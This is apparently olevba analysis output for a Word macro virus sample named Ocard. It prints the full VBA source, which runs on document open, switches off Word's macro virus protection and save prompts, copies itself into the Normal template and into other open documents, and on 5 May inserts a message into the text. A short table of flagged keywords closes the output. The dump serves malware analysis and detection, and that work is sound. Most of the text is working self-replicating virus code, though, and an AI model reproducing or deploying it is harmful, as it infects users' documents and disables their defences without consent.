olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ocard-589659b2df545027020df9ff1fedcc89913af3b5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ocard-589659b2df545027020df9ff1fedcc89913af3b5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Draco Malfoy
Dim a As Document, t As Template
Dim beak As Double, str As String
Dim i, salmon As Integer
On Error Resume Next
Set a = ActiveDocument
Set t = NormalTemplate
'Coups -36
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
If Left(a.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 6) = "'Draco" Then
    salmon = vbOK
End If
If Left(t.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 6) = "'Draco" Then
    salmon = salmon + vbCritical
End If
Select Case salmon
    Case vbOK
    str = a.VBProject.VBComponents.Item(1).CodeModule.Lines(1, a.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    With t.VBProject.VBComponents.Item(1).CodeModule
        .DeleteLines 1, .CountOfLines
        .AddFromString str
        beak = Val(Mid(.Lines(9, 1), 7, Len(.Lines(9, 1)))) + 1
        .ReplaceLine 9, "'Coups " & beak
        If beak Mod 2 Then
            .ReplaceLine 1, Left(.Lines(1, 1), 21) & "Close()"
        Else
            .ReplaceLine 1, Left(.Lines(1, 1), 21) & "Open()"
        End If
    End With
    Case vbCritical
    str = t.VBProject.VBComponents.Item(1).CodeModule.Lines(1, t.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    With a.VBProject.VBComponents.Item(1).CodeModule
        .DeleteLines 1, .CountOfLines
        .AddFromString str
    End With
    Case vbByte
    str = a.VBProject.VBComponents.Item(1).CodeModule.Lines(1, a.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    For i = 1 To Word.Windows.Count
        With Word.Windows.Item(i).Document.VBProject.VBComponents.Item(1).CodeModule
            If Left(.Lines(2, 1), 6) <> "'Draco" Then
                .DeleteLines 1, .CountOfLines
                .AddFromString str
            End If
        End With
        Word.Windows.Item(i).Document.Save
    Next i
End Select
If Month(Now) = 5 And Day(Now) = 5 Then
    If Right(a.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1), 7) = "Close()" Then
        Selection.TypeText "Is it not a Camel ? "
        a.Save
    End If
End If
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

